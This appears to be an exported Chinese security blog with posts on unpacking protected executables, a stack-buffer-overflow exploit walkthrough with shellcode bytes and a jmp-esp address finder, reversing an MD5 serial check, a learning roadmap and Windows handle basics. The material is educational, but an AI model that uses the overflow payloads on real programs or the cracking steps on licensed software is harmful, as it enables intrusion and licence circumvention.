跳转到程序原入口点(OEP)，从这个时候起，壳就把控制权还给原程序了。越来越多的加密壳先将 OEP 代码段搬到外壳的地址空间里，再将这段代码清除（这种技术称为 “Stolen Bytes”)。这样，OEP与外壳之间那条明显的 “分界线” 就消失了，脱壳的难度也就增加了。 脱壳(主要是手动脱壳) 查找真正的程序入口点 抓取内存映像文件 重建PE文件程序 执行时，外壳代码首先获得控制权，模拟windows加载器，将原来的程序回复到内存中，此时内存中的数据就是加壳前的映像文件。适时将其抓取并修改，即可还原到加壳前的状态。 2. 脱壳 寻找OEP当外壳所保护的程序运行时，会先执行外壳程序，外壳程序负责将在内存中把源程序解压还原，并将控制权还给解压后的真正程序，再跳转到原来的程序入口点。这个入口点称为“OEP” 根据跨段指令寻找OEP：当外壳代码处理完毕会跳转带程序本身的代码处；所以根据跨段的转移指令就能找到真正的程序入口点。 根据内存访问断点寻找OEP：待代码段解压完毕对代码段设置内存访问断点。如果之前设置了断点，程序会不停的对代码进行写入的指令处中断。解决方法：即设置两次内存断点。因为一般的壳会依次对.text、 .rdata 、 .data 、 .rsrc区块进行解压处理，所以，可以先在.rdata 、 .data 等 区块处设置内存访问断点，待程序中断， 代码段已解压，再对代码段(.text块）设置内存访问断点，到达OEP。 根据栈平衡原理寻找OEP：在编写加壳软件时，必须保证外壳初始化的现场环境（各寄存器值）与原程序的现场环境是相同的（主要是esp、 ebp等重要的寄存器值）。加壳程序在初始化时保存各寄存器的值，待外壳执行完毕恢复 各寄存器的内容， 最后跳转到原程序执行。通常用pushad/popad、pushfd/popfd指令对来保存与恢复现场环境 。其中，eflags (标志寄存器 ）不是太重要， 一般不 处理它。也就是说，在编写加 壳软件时，必须遵守栈平衡原理。 PUSHAD 相当于push eax/ecx/edx等 … 外壳代码 POPAD 相当于pop eax/ecx/edx等 JMP OEP 准备跳到入口点 OEP: … 解压后程序的源代码 抓取内存映像抓取内存映像， 也称 “转存” (Dump), 是指把内存指定地址的映像文件 读出，用文件等形式将其保存下来的过程。脱壳时，在何时Dump 文件是有一定技巧的。在一般情况下，当外壳来到 OEP 处时进行Dump 是正确的。如果等到程序运行起来， 由于一些变量已经初始化了， 不适合进行 Dump。在外壳处理过程中， 外壳要把压缩后的全部代码数据释放到内存中， 并初始化一些项目。 Dump原理：常用的Dump软件 有LordPE、PETools等。这类工具一般利用 Module32Next来获取欲Dump 进 程的 基本信息。Module32Next 函数的原型如下： 1234BOOL Module32Next(HANDLE hSnapshot ,LPMODULEENTRY32 lpme) • hSnapshot : 由先前的CreateToolhelp32Snapshot 函数返回的快照。• lpme: 指向MODULEENTRY32结构的指针。 每次执行函数后，都会把一个进程的信息填入MODULEENTRY32结构。 123456789101112typedef struct tagMODULEENTRY32 &#123;DWORD dwSize;DWORD th32ModuleID;DWORD th32ProcessID;DWORD GlblcntUsage;DWORD ProccntUsage;BYTE *modBaseAddr;DWORD modBaseSize;HMODULE hModule;TCHAR szModule[MAX_PATH];TCHAR szExePath[MAX_PATH];&#125; MODULEENTRY32, *PMODULEENTRY32, *LPMODULEENTRY32; LordPE和ProcDump都是先根据此结构中的 modBaseSize和modBaseAddr 字段得到进程的映像 大小和基址，再调用 ReadProcessMemory来读取进程内的数据的。如果读取成功，ProcDump会检测 IMAGE_DOS_SIGN ATURE和IMAGE_NT_SIGNATURE 是否完整。如果完整，就基本上不会对剩余的大多数字段进行检验了；如果不 完整， 会根据 szExePath字段打开进程的原始文件 ，读取其文件头以取代进程的文件头。LordPE则更简单，根本不使用进程的文件头，而直接读取原始文件 的文件头， 在读取内存数据后，再把进程中的数据保存到磁盘文件 中。 重建PE文件破坏原程序的输入表是加密外壳必须具备的功能。在脱壳中，输入表处理是此要求脱壳者对PE格式中的输入表概念非常清楚。 输入表重建的原理：在输入表结构中，与实际运行相关的主要是IAT结构，这个结构用于保存 API的实际地址。PE文件运行时将初始化输入表的这一部分，Wind ows加载器首先搜索 OriginalFirstThunk, 如果存在，加载程序将迭代搜索数组中的每个指针，找到每个IMAGE_IMPORT_BY_NA ME 结构所指向的输入函数的地址，然后，加载器用函数真正的入口地址代替由FirstThunk指向的IMAGE_THUNK_DATA 数组里元素的值。 此时，输入表中的其他部分就不重要了，程序依靠IAT提供的函数地址就可以正常运行。外壳程序一般都会修改原程序文件的输入，然后自己模仿PE装载器来填充IAT的相关数据，也就是说，内存中只有一个IAT, 原程序的输入表不在内存中。输入表重建就是根据这个IAT还原整个输入表的结构（即如图16.17所示的这个结构），包括IID结构及其各成员指向的数据等。一些加密软件为 了防止输入表被还原， 就在IAT加密上大作文章。此时， 由外壳填充到IAT里 的不是实际的 API 地址，而是用于Hook API的外壳 代码的地址 。这样， 外壳中的代码一旦完成了加 载工作，在进入原程序的代码之后，仍然能够间接 获得程序的控制权。因为程序总要与系统打交道，与系统打交道的途径是 API, 而API的地址已经被替换成了外壳的Hook API的地址，所以， 每次程序与系统打交道，都会让外壳的代码获得一次 控制权。这样， 外壳 就可以 进行反跟踪， 从而继续保护软件， 同时完成某些特殊的任务了 。综上所述， 重建输入表的关键是获取未加密的IAT。 一般的 做法是跟踪加壳程序对IAT的处理过程， 修改相关指令， 不让外壳加密 IAT。 确定IAT的地址与大小：一般程序的IAT是连续排列的， 以一个DWORD字的O作为结束， 因此， 只要确定IAT的一个点， 就能获得整个IAT的地址和大小。 根据IAT重建输入表：数据处理完成后，UPX外壳使用了一次跨段的转移指令勺mp)跳转到OEP,发现OEP的地址为401000h,因此只需要在4052BFh处设置断点。程序中断后，运行LordPE,将内存数据Dump出来并保存为dumped.exe。用十六进制工具在dumped.exe文件中找一块空间，在这里选择2100h,将表16.1中的DLL名和函数名写进去，如图16.27所示。DLL名与函数名的位置可以任意指定。在每个函数名前面要留2 字节来存放函数的序号，序号可以为O;每个函数名后的1字节为O;每个函数名或DLL名的起始地址必须按偶数对齐， 空隙用0填充。由千是内存映像文件，文件 偏移地址与相对虚拟地址(RVA)的值是相等的，IAT 的位置很重要，不能改变，否则相关指令就找不到函数调用地址了（除非再修正这些函数调用的地址）。IAT 中的内容可以不重新构造，当加载PE文件时，Windows操作系统会对其进行填充。]]></content>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[再谈栈溢出]]></title>
    <url>%2F2019%2F08%2F05%2F%E5%86%8D%E8%B0%88%E6%A0%88%E6%BA%A2%E5%87%BA%2F</url>
    <content type="text"><![CDATA[再谈栈溢出 ​ 上回书说到，向缓冲区内填充数据，如果数据很长，超过缓冲区本身容量，数据会溢出空间，覆盖合法数据。但是，可以精心设计溢出数据，造成攻击。 1. 本地缓冲区溢出简单利用已有条件： 1. 知道有问题程序返回点的精准地址，即可以把他覆盖成任意地址。 2. 有了shellcode。 3. 把有问题程序返回点地址覆盖成shellcode地址，即可成功利用缓冲区溢出。现在的目的：shellcode的地址是什么？即把返回点地址覆盖成什么？ ​ 在windows下利用系统核心dll里的指令完成跳转。 ​ 用系统核心dll中的jmp esp 地址来覆盖返回地址，然后把shellcode紧跟其后。 ​ 利用格式：NNNNNNNNRSSSSSSSS，N=Nop，R=jmp esp，S=shellcode。 覆盖之后堆栈图示： … Nop Nop Nop Jmp esp（原eip） S0 S1 S2 s3 … 函数执行完成之后，esp指向原eip地址，而eip指向Ret指令 （eip指向下一条指令地址，Ret指令相当于pop eip）。 当eip被覆盖为 jmp esp之后，ret 相当于指向 jmp esp的地址。然后esp下移，指向S0，然后开始执行Shellcode。 11. EIP 指令指针指向下一条要执行的命令，一般会自动加 2. ESP 堆栈顶指针指向堆栈的顶部。在PUSH 时，ESP 往上走，减 1；在 POP 时，ESP 往下走，加 1。 2. 栈溢出的简单构筑以一简单c为例： 123456789101112#include&lt;cstdio&gt;#include&lt;cstring&gt;int main() &#123; char name[] = "tfire"; char output[8]; strcpy(output, name); for (int i = 0; i &lt; 8; i++) &#123; printf("\\0x%x", output[i]); &#125; return 0;&#125; 执行结果： 1\0x74\0x66\0x69\0x72\0x65\0x0\0xfffffffe\0xfffffffe 给出转换表： 给出shellcode机器码（功能为打开dos窗口）： 1234char shellcode[]=&#123;0x8B,0xE5, 0x55,0x8B,0xEC,0x83,0xEC,0x0C,0xB8, 0x63,0x6F,0x6D,0x6D,0x6D,0x6D,0x6F,0x63,0x89, 0x45,0xF4,0xB8,0x61,0x6E,0x64,0x2E,0x89,0x45, 0xF8,0xB8,0x63,0x6F,0x6D,0x22,0x89,0x45,0xFC, 0x33,0xD2, 0x88,0x55,0xFF, 0x8D,0x45,0xF4, 0x50, 0xB8,0x24,0x98,0x01,0x78, 0xFF,0xD0&#125;; 将name[]进行构造： name[8] ebp RET ShellCode AAAAAAAA AAAA 0x76388b13 SSSSSSSS 关于这个jmp esp的地址，会因为windows版本不同而不同。 在网上找了一个加载动态库esp地址的代码（这个还没看到…） 12345678910111213141516171819202122232425#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(int, char**, char**)&#123; BYTE* pbyte; int nPos = 0, nAddr = 0; HINSTANCE hHinst = NULL; bool bTips = true; hHinst = LoadLibrary("user32.dll"); if (!hHinst) return 0; pbyte = (BYTE*)hHinst; while (bTips) &#123; if (pbyte[nPos] == 0xff &amp;&amp; pbyte[nPos + 1] == 0xe4) &#123; nAddr = (int)pbyte + nPos; printf("address is 0x%x\n", nAddr); bTips = false; &#125; else nPos++; &#125; if (hHinst != NULL) FreeLibrary(hHinst); return 1;&#125; 输出地址： 10x76388b13 将代码合并整理： 12345678char name[]=&#123; "\x41\x41\x41\x41\x41\x41\x41\x41"//name=AAAA "\x41\x41\x41\x41" //ebp=AAAA "\x13\x8b\x38\x76" //覆盖成jmp esp地址 "0x8B,0xE5, 0x55,0x8B,0xEC,0x83,0xEC,0x0C,0xB8, 0x63,0x6F,0x6D,0x6D,0x6D,0x6D,0x6F,0x63,0x89, 0x45,0xF4,0xB8,0x61,0x6E,0x64,0x2E,0x89,0x45, 0xF8,0xB8,0x63,0x6F,0x6D,0x22,0x89,0x45,0xFC, 0x33,0xD2, 0x88,0x55,0xFF, 0x8D,0x45,0xF4, 0x50, 0xB8,0x24,0x98,0x01,0x78, 0xFF,0xD0" //此处为shellcode地址，功能为打开dos窗口&#125; 接下来执行程序，明明是字符串的复制，却会打开dos窗口，至此，缓冲区溢出构建完成。 3. 溢出实例看一个简单代码： 1234567891011121314151617#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, const char * argv[]) &#123; char passsword[8] = "secret", input[8]; while (1) &#123; printf("Enter your password:"); gets(input); if (strcmp(input, passsword) == 0) &#123; printf("Welcome!\n"); break; &#125;else &#123; printf("Sorry,your password is wrong.\n"); &#125; &#125; return 0;&#125; 看看结果吧 What？？ 输入ok居然对了？？ 这就是缓冲区溢出造成的，具体已经解释过了，着迷人的魅力啊~]]></content>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[几种加密算法]]></title>
    <url>%2F2019%2F08%2F02%2F%E5%87%A0%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[浅谈几种加密算法之Hash算法 单向散列算法（Hash算法） 简介：常见的Hash算法包括MD5，SHA， RIPE-MD ，HAVAL等 对于解密而言，只要能识别出是何种算法，就可以直接套用相关算法的源码解决。 1.MD5算法：算法原理： 数据填充：附加一个1在消息后面，然后用0来填充，直到消息长度与448模512同余（长度=448模512），即填充后的消息长度比512的倍数小64位 添加长度：如果填充前消息的长度大于2的64次方 , 则只使用其低 64位。添加填充位和消息长度之后，最终消息的长度正好是 512 的整数倍。令 M[O···N-I] 表示最终的消息，其中 N是 16 的倍数。 初始化变量：用4个变量(A、B、C、D)来计算消息摘要。这里的A、B、 C、D都是32位的寄存器。这些寄存器以下面的十六进制数来初始化：A = 01234567h, B = 89abcdefh, C = fedcba98h, D = 7654321 Oh 而且，在内存中是以低字节在前的形式存储的， 即如下格式： 101 23 45 67 89 AB CD EF FE DC BA 98 76 54 32 10 数据处理：所用的加法常数由表T[i]来定义， 其中 l为1至64之中的值。T[i]等于4294967296乘以abs(sin(i))所得结果的整数部分， 其中l用弧度来表示。这样做是为了通过正弦函数和幕函数来进一 步消除变换中的线性。 算法具体实现较为复杂。 1234A=A+AAB=B+BB C=C+CC D=D+CC 输出：当512位分组都运算完毕， A、 B、 C、 D的级联将被输出为MD5散列的结果。 算法应用：​ 看一看如下使用MD5判断注册码的伪码： 1234567 if ( MD5(用户名) ＝＝ 序列号 )​ 正确的注册码；​ else​ 错误的注册码 从上面看出了什么？ 序列号就以明文的形式存在内存中！！！ MD5代码的特点非常明显， 跟踪时很容易发现。 如果软件采用MD5算法， 在初始化数据时必然会用到上面提到的4个常数(A、 B 、 C、 D)。 实际上， 像KANAL这样的算法分析工具不是通过这4个常数来鉴别MD5的，而是通过识别具有64个常骰元素的表T来判断是不是MD5算法的。对于变形的MD5算法，常见的情况有3种： 一是改变初始化时用到的4个常数；二是改变填充的方法； 三是改变Hash变换的处理过程。 在解密时， 只要跟踪以上这些点， 对MD5的源代码进行修改， 就可以实现相应的注册机制了 实例：用OD打开一个例子： 123456789101112131415161718192021220040118B |. FFD5 call ebp ; \GetDlgItemTextA0040118D |. 83F8 13 cmp eax, 13 ; 密码长度0x13位00401190 |. 0F85 F3000000 jnz 0040128900401196 |. 8A4C24 64 mov cl, byte ptr [esp+64] ; 注册码第五位是-吗0040119A |. B0 2D mov al, 2D0040119C |. 3AC8 cmp cl, al0040119E |. 0F85 E5000000 jnz 00401289004011A4 |. 384424 69 cmp byte ptr [esp+69], al ; 注册码第十位是-吗004011A8 |. 0F85 DB000000 jnz 00401289004011AE |. 384424 6E cmp byte ptr [esp+6E], al ; 注册码第十五位是-吗004011B2 |. 0F85 D1000000 jnz 00401289004011B8 |. 8B4C24 65 mov ecx, dword ptr [esp+65]004011BC |. 8B4424 60 mov eax, dword ptr [esp+60]004011C0 |. 8B5424 6A mov edx, dword ptr [esp+6A]004011C4 |. 894C24 14 mov dword ptr [esp+14], ecx004011C8 |. 894424 10 mov dword ptr [esp+10], eax004011CC |. 8B4424 6F mov eax, dword ptr [esp+6F]004011D0 |. 8D8C24 280100&gt;lea ecx, dword ptr [esp+128]004011D7 |. 895424 18 mov dword ptr [esp+18], edx004011DB |. 51 push ecx ; MD5 Content004011DC |. 894424 20 mov dword ptr [esp+20], eax004011E0 |. E8 CB000000 call 004012B0 此处跟进004012B0,进行MD5的初始化; 123456789004012B0 /$ 8B4424 04 mov eax, dword ptr [esp+4]004012B4 |. 33C9 xor ecx, ecx004012B6 |. 8948 14 mov dword ptr [eax+14], ecx004012B9 |. 8948 10 mov dword ptr [eax+10], ecx004012BC |. C700 01234567 mov dword ptr [eax], 67452301004012C2 |. C740 04 89ABC&gt;mov dword ptr [eax+4], EFCDAB89004012C9 |. C740 08 FEDCB&gt;mov dword ptr [eax+8], 98BADCFE004012D0 |. C740 0C 76543&gt;mov dword ptr [eax+C], 10325476004012D7 \. C3 retn 保存散列值的缓冲区地址； 1230040122A |. 51 push ecx0040122B |. 52 push edx0040122C |. E8 5F010000 call 00401390 经过call调用，保存在edx中； 计算MD5值 1234567891011121314151600401231 |. 83C4 14 add esp, 1400401234 |. 33C0 xor eax, eax00401236 |&gt; 8A8C04 800100&gt;/mov cl, byte ptr [esp+eax+180]0040123D |. 83E1 1F |and ecx, 1F00401240 |. 40 |inc eax00401241 |. 83F8 10 |cmp eax, 1000401244 |. 8A540C 3C |mov dl, byte ptr [esp+ecx+3C]00401248 |. 889404 0F0300&gt;|mov byte ptr [esp+eax+30F], dl0040124F |.^ 7C E5 \jl short 0040123600401251 |. 8D8424 100300&gt;lea eax, dword ptr [esp+310]00401258 |. 8D4C24 10 lea ecx, dword ptr [esp+10]0040125C |. 50 push eax ; /String20040125D |. 51 push ecx ; |String10040125E |. FF15 00604000 call dword ptr [&lt;&amp;KERNEL32.lstrcmpA&gt;] ; \lstrcmpA00401264 |. 85C0 test eax, eax00401266 |. 75 21 jnz short 00401289]]></content>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典栈溢出问题]]></title>
    <url>%2F2019%2F07%2F30%2F%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[经典栈溢出问题 ​ 说到二进制安全，肯定避不开栈溢出，今天就拿栈溢出作为开始，讨论一下它的形成与构造。 1. 程序的内存空间​ 首先，先介绍一下应用程序内存空间布局，用一张图来说明，简单粗暴。 简单介绍一下就是，每个应用程序都有4个GB的虚拟空间（在windows编程的虚拟内存中介绍了），高1个GB作为内核空间，用户代码无权访问，所有的应用程序共享这部分空间。而低3个GB的空间是用户代码，有stack ，heap ，MMap（存放动态链接库）等等，本文重点介绍stack。 有关堆，栈在虚拟空间中的概念： 1.栈自底向上增长，尺寸动态变化，默认临界大小是8M。 2.Stack和mmap间有个随机偏移量用于防止栈溢出污染mmap。 3.Mappings区间主要布置动态链接库。 4.默认进程堆自顶向下增长。 2. 栈帧 栈是一种LIFO的数据结构。 应用程序有一到多个用户态栈。 栈自底向上增长，由指令PUSH和POP引起其动态变化。 局部变量布局在栈中。 调用函数时参数由栈传递，返回地址也存储于栈中。 函数调用上下文与局部变量共同组成了栈帧——Stack Frame. 总结一下：栈帧=局部变量+函数调用上下文 再简单点的说：栈帧实际上只是一个通俗的说法，关于栈帧的上下界历来有两种说法，一曰以EBP和ESP之间的栈空间视为栈帧，这也是主流说法；一曰以调用参数和ESP之间的栈空间视为栈帧，我个人更倾向于这种说法，因为它便于理解。 3. 经典栈溢出的手法经典栈溢出的手法概要： 先决条件：栈局部变量可控，存在溢出(strcpy)。 通过栈空间精心布局，布置shellcode，并用shellcode起始地址覆盖栈帧的ret addr。 存在的问题： Shellcode地址在不同PC上不确定 每次运行地址都会变化（ASLR） 拿一个例子说明： 出现的问题： fread时，指定的长度1024超过了buf尺寸。 输入数据长度可控，在input.txt中。 可以精心操纵input.txt，对buf进行溢出布置shellcode、覆盖ret addr。 当返回的地址可以被控制时，问题就大发了。 具体如何实现呢： 确定栈帧布局，计算出buf到ret addr的offset。 先对buf填充无效数据，通过调试找出buf的首地址并覆盖ret addr。 用一段shellcode填充buf，这段shellcode会弹一个shell。 4. you jump ，i jump esp以上的栈溢出是存在明显问题的。 首先就是硬编码buffer地址的缺陷： 1. 对于不同版本系统来说，硬编码的地址是硬伤。Windows尚有dll装卸引起的“移位”。​ 2. 在ASLR引入以后，栈每次运行基址都是随机的。 解决方法： 一般情况下，ESP寄存器中的地址总是指向系统栈中且不会被溢出的数据破坏，函数返回时，ESP所指向的位置恰好是我们所淹没的返回地址的下一个位置。 现在问题就转化成了如何寻找“JMP ESP”的字节码地址。 本质：从内存空间的各个映像中寻觅”JMP ESP”的字节码地址。 对Linux来说：ELF映像本身加载的so 对Windows来说：PE映像本身加载的dll 要点：尽量择取具有高稳定性的”JMP ESP”指令的地址。 以上就是以我目前所学简单介绍一下栈溢出的问题，还有待补充，未完待续…]]></content>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[说说逆向与二进制]]></title>
    <url>%2F2019%2F07%2F30%2F%E6%BC%AB%E6%BC%AB%E4%BA%8C%E8%BF%9B%E5%88%B6%2F</url>
    <content type="text"><![CDATA[我的二进制之路当我狠下心想学习二进制安全的时候，可能我已经疯了。 ​ ——写在前面 关于二进制 先聊聊其他的，关于二进制安全这一方面，我一开始也刷了很多别人的评论与看法，有从入门到放弃的，有行业顶尖大牛的，褒贬不一。但比较中肯的统一的看法是：入门难，就业难。 ​ 诶，人生不易。好不容易，遇到了自己感兴趣的东西，还是坚持一下吧，学习总会是有收获的。就算以后改行了，至少会因为自己为了小小的梦想而努力过高兴吧。 首先，二进制安全，初衷是什么？ 答案是宏伟的：拥有getshell任意一台电脑的能力 （据小道消息透露，“安全就是个失败的方向，而二进制又是失败中的失败”，有点苦涩哈哈哈哈） ​ 好了好了，言归正传，那么如何系统的学习二进制安全呢? ​ 其实我也不知道… ​ 我看了很多别人的说法，还是有点分歧，但有一点是不会变得，那就是最底层的东西，C啊，C++啊，好吧，这些都能变，那汇编呢，机器语言呢，这总不会变了吧。 ​ 那就行开始吧。 ​ 路漫漫其修远兮，吾将上下而求索。 ​ 先贴一张图，提问的智慧，感觉还是蛮有意思的 ​ 这篇文章不聊技术向的问题，就聊个大概的学习路线。 ​ 学习二进制，最起码的语言要会吧？ 1. x86汇编 2. c / c++ 3. python 4. windows编程（可以隶属c / c++）以上是我现在看了个一知半解的，以后肯定还要学习其他的，以后再说 ​ 要会二进制，没有一手拿得出手的敲代码能力怎么行？ 1. windows核心编程 2. c/c++ 3. python 4. python的灰帽子与自动化运维 5. 精通黑客脚本 ​ 学二进制，没有一点系统知识真的好吗？ 1. 深入理解计算机原理 2. 深入理解linux内核 3. windows内核安全编程 4. windows内核的原理与实现 5. 操作系统（这门课还挂了，难搞哦~） ​ 没有技巧，学什么二进制，还不如溜了溜了 1. reversing C ++ 2. c++的反汇编与逆向分析 3. 软件调试案例 4. 黑客攻防技术宝典 5. 0day安全 6. 漏洞战争-软件漏洞分析技术 7. 逆向工程核心原理 8. 加密与解密 9. IDA Pro权威指南 ​ 学习是死的，总得动手去干吧 1. 游戏外挂开放艺术 2. 捉虫日记 3. 黑客面杀 4. 恶意代码分析 5. 安全软件开发之道 6. The Shellcodes Handbook 关于逆向：0x01: 打基础欲学逆向，先懂正向。首先至少会点C和C++吧，要是只会个python或java、VB、C#什么的，连指针都不熟悉就有点难整了，还得会点8086汇编，8086学完还得学x86汇编（有了8086的基础学起来会很快），在这期间可以破解一些简单的小软件找点成就感 资料获取：C和C++就不说了，8086汇编可以看王爽老师的《汇编语言》和小甲鱼的汇编视频教程，x86可以看《Windows环境下32位汇编语言程序设计》。 0x02: 开始学习逆向打完基础后，可以开始逆向分析一些小程序，最好是手里有源码或者自己写一个，用OD在入口点直接跟踪分析到结束，一边跟源码作对比。学习代码编译成汇编会是什么样的，编译器附加了什么，debug和realease版本又有什么区别，不同语言编译后的汇编代码又有什么特点，F2、内存、硬件断点的原理又是啥……还有学习PE结构，了解文件加载运行机制，这是分析加壳软件和病毒的必备基础：如何在PE中插入代码或EXE文件，ESP定律、二次三次内存断点是如何走到OEP的。 资料获取：编译原理可以看《C++反汇编与逆向分析》，PE结构可以看小甲鱼的解密系列-系统篇视频教程，还可以看《Windows PE权威指南》、《逆向工程核心原理》，还有看雪大佬的《加密与解密》。 0x03: 入门此时逆向不能再单靠OD了，得学学神器IDA，IDA能将大部分代码反编译成类C代码，会方便很多，能静态分析的没必要动态跟踪，IDA还有很多强大的功能这里就不一一列举了。然后还得深入学习系统底层运行机制，了解内核工作原理；看别人分析病毒的文章，并自己尝试着分析一下；学习堆栈溢出原理及利用方法等等…… 资料获取：《IDA Pro权威指南》、吾爱破解和看雪等论坛、《Windows内核工作原理》、《0day安全：软件漏洞分析技术》、《软件调试》、《Windows核心编程》等等。 关于大的方向：​ 主要还是逆向吧，先学汇编，然后找Crack me练手，然后学习软件的加壳与脱壳，先把基础部分掌握。 ​ 再然后学习windows编程，PE结构，学习编写外挂 ​ 再转向移动端，开发与逆向。 冰山一角。 ​ 先列下来这么多，以后有什么继续要学的再慢慢补充。 ​ 欢迎大家提出意见，一起交流学习。 ​ 关于技术向的干货，慢慢补充。 ​ 一边学习，一边思考，一边记录， ​ 永远保持一颗好奇心， 头发我不要了还不行吗。]]></content>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows编程之句柄hwnd与hdc的区别]]></title>
    <url>%2F2019%2F07%2F28%2Fwindows%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%8F%A5%E6%9F%84hwnd%E4%B8%8Ehdc%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[谈谈hdc与hwnd的区别 hWnd 与hDC的概念hWnd(Handle of Window，也可以这么说：h是类型描述，表示句柄；wnd是变量对象描述，表示窗口)是窗口句柄，其中包含窗口的属性。例如，窗口的大小、显示位置、父窗口。 hDC(Handle to Device Context)是图像的设备描述表，窗口显示上下文句柄，其中可以进行图形显示。 利用hDC=GetDC(hWnd)，可以获得一个窗口的图形设备描述表。可以通过ReleaseDC()函数释放。 hWnd句柄是描述一个窗口的形状、位置、大小、是否显示、它的父窗口、兄弟窗口、等等的一组数据结构；hDC句柄是一个实实在在的用于具体表现这个窗口时，需要对这个窗口有个场合来实现的地方。 hWnd是窗体句柄；hDC是设备场景句柄。hWnd与窗口管理有关；hDC与绘图API（GDI函数）有关。hWnd是windows给窗口发送消息（事件）用的；hDC是把窗口绘制在屏幕上用的。 有了hWnd，可以使用API的GetDC()函数得到与其相关的hDC：hDC=GetDC(hWnd)。 hWnd与hDC都是句柄，但是hWnd是窗口句柄而hDC是设备描述表的句柄。 在Windows标编程设计中，使用了大量的句柄来标识对象。一个句柄是指使用的一个唯一的整数值，即一个4字节（64位程序中为8字节）长的数值，来标识应用程序中的不同对象和同类中的不同的实例，例如：一个窗口、按钮、图标、滚动条、输出设备、孔健、文件等。应用程序能通过句柄来访问相应的对象的信息。但是句柄不是指针，程序不能利用句柄来直接阅读文件中的信息。如果句柄不在I/O文件中，它是毫无用处的。我们来看看另一个好理解的说法：在进程的地址空间中设一张表，表里头专门保存一些编号和由这个编号对应一个地址，而由那个地址去引用实际的对象，这个编号跟那个地址在数值上没有任何规律性的联系，纯粹是个映射而已。在Windows系统中，这个编号就叫做”句柄”。 句柄实际上是一种指向某种资源的指针，但与指针又有所不同：HWND是跨进程可见的，而指针从来都是属于某个特定进程的。指针对应着一个数据在内存中的地址，得到了指针就可以自由地修改该数据。Windows并不希望一般程序修改其内部数据结构，因为这样太不安全。所以Windows给每个使用GlobalAlloc等函数声明的内存区域指定一个句柄(本质上仍是一个指针，但不要直接操作它)，平时我们只是在调用API函数时利用这个句柄来说明要操作哪段内存。 实例：​ HWND hwnd;//窗口句柄​ char szAppName[] = “window1”; //创建窗口 hwnd = CreateWindow(szAppName, //窗口类型名 TEXT(“The First Experiment”), //窗口实例的标题 WS_OVERLAPPEDWINDOW, //窗口风格 CW_USEDEFAULT, //窗口左上角位置坐标值x CW_USEDEFAULT, //窗口左上角位置坐标值y 800, //窗口的宽度 600, //窗口的高度 NULL, //父窗口的句柄 NULL, //主菜单的句柄 hInstance, //应用程序实例句柄 NULL ); //显示窗口 ShowWindow(hwnd, iCmdShow); UpdateWindow(hwnd); static int nWidth, nHeight; HDC hdc;//定义设备环境句柄 HBRUSH hB;//定义画笔句刷case WM_LBUTTONDOWN://按下鼠标左键则用户区被刷成灰色 nWidth = GetSystemMetrics(SM_CXFULLSCREEN); //屏幕宽度 nHeight = GetSystemMetrics(SM_CYFULLSCREEN); //屏幕高度 hdc=GetDC(hwnd); hB = (HBRUSH)GetStockObject(GRAY_BRUSH);//灰色画刷 SelectObject(hdc, hB); Rectangle(hdc, 0, 0, nWidth, nHeight);//将用户区重新刷成灰色 DeleteObject(hB);//删除画刷 ​ return 0;]]></content>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows编程之句柄hwnd详解]]></title>
    <url>%2F2019%2F07%2F28%2Fwindows%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%8F%A5%E6%9F%84hwnd%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[深入了解Windows句柄是什么 Windows是一个以虚拟内存为基础的操作系统，很多时候，进程的代码和数据并不全部装入内存，进程的某一段装入内存后，还可能被换出到外存，当再次需要时，再装入内存。两次装入的地址绝大多数情况下是不一样的。也就是说，同一对象在内存中的地址会变化。那么，程序怎么才能准确地访问到对象呢？为了解决这个问题，Windows引入了句柄。 1.虚拟内存结构CPU通过寻址来访问内存，32位CPU的寻址宽度度是 0~0xFFFFFFFF ，计算后得到的大小是4G，也就是说可支持的物理内存最大是4G。但在实践过程中，碰到了这样的问题，程序需要使用4G内存，而可用物理内存小于4G，导致程序不得不降低内存占用，这个时候操作系统就会借助磁盘空间来做虚拟的内存空间，把当前进程不需要的数据放在磁盘上，等到用到的时候，在利用调度算法把所需要的数据从磁盘空间上调度到内存，虚拟内存就是为了扩大内存的容量，每当我们要运行一个程序的时候经过编译以后形成的仅仅是逻辑上的空间，根本不是可以直接运行的内存空间，所以它还存在一个地址映射的概念。 为了解决这一问题，CPU引入MMU（内存管理单元） MMU的核心思想是利用虚拟地址替代物理地址。CPU寻址时使用虚拟地址，MMU将虚拟地址映射为物理地址，他的引入解决了对物理内存的限制。 既然有了内存管理单元，就得有内存管理机制——内存分页（Paging） 它将虚拟地址和物理地址按照固定大小（4K）分割成页(page)和页帧(page frame)，并保证页与页帧的大小相同，所以页的个数必定多于页帧的个数。 在计算机上有一个页表（page table），就是映射虚拟内存页到物理内存页的，更确切的说是页号到页帧号的映射，而且是一对一的映射。但是问题来了，虚拟内存页的个数 &gt; 物理内存页帧的个数，岂不是有些虚拟内存页的地址永远没有对应的物理内存地址空间？不是的，操作系统是这样处理的。操作系统有个页面失效（page fault）功能。操作系统找到一个最少使用的页帧，让他失效，并把它写入磁盘，随后把需要访问的页放到页帧中，并修改页表中的映射，这样就保证所有的页都有被调度的可能了。 虚拟内存地址由页号（对应映射到一个页帧）和偏移量组成 